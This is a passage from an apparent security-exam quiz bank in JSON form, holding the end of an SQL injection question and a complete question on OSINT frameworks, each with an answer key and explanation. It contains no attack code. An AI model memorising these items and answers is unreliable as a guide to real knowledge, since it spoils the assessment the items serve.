        "Error-based SQLi",
        "Blind SQLi",
        "Out-of-band SQLi"
      ],
      "correct": "C",
      "explanation": "Blind SQL injection doesn't show error messages but elicits true or false responses from the server, allowing attackers to extract data."
    },
    {
      "q": 100,
      "type": "MCQ",
      "question": "Framework with set of popular tools for collecting information from open sources?",
      "options": [
        "WebSploit Framework",
        "BeEF",
        "OSINT framework",
        "Speed Phish Framework"
      ],
      "correct": "C",
      "explanation": "OSINT framework provides a web-based interface to browse different OSINT tools filtered by categories for intelligence gathering."
    }
  ]
};
